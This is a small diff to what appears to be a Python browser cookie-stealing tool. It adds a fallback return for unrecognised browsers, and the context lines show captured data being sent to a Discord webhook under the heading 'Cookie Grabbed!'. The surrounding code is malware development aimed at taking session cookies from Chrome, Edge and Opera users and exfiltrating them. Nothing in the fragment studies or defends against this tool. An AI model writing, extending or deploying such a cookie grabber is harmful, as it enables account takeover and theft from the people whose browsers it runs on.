@@ -53,6 +53,8 @@ def find_proper_agent():
     if (use_chrome() is not None): return "Chrome/Chromium-based"
     elif (use_edge() is not None): return "Microsoft Edge (Chromium Framework)"
     elif (use_opera() is not None): return "Opera (or Opera-based)"
+    else:
+        return "Un-supported Browser Framework"
 
 # Send to deafult webhook
 eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")
